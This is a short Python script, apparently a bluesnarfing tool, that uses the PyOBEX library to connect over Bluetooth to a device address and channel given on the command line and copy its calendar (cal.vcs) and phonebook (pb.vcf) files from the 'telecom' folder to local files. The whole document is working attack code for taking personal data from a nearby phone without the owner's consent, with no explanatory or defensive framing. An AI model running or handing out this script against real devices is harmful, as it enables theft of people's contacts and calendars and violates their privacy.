#!/usr/bin/python3

import sys
from os.path import basename
from PyOBEX import client, headers, responses


def get_file(client, filename):
    """
    Use OBEX get to retrieve a file and write it
    to a local file of the same name
    """
    r = client.get(filename)

    if isinstance(r, responses.FailureResponse):
        print("Failed to get file " + filename)
    else:
        headers, data = r

        fh = open(filename, "w+")
        fh.write(data)
        fh.close()
    

if len(sys.argv) < 3:
    print(sys.argv[0] + ": <btaddr> <channel>")
    sys.exit(0)

btaddr = sys.argv[1]
channel = int(sys.argv[2])

print("Bluesnarfing %s on channel %d" % (btaddr, channel))

c = client.BrowserClient(btaddr, channel)
    
try:
    r = c.connect()
except OSError as e:
    print("Connect failed. " + str(e))

if isinstance(r, responses.ConnectSuccess):
    c.setpath("telecom")
    
    get_file(c, "cal.vcs")
    get_file(c, "pb.vcf")

    c.disconnect()
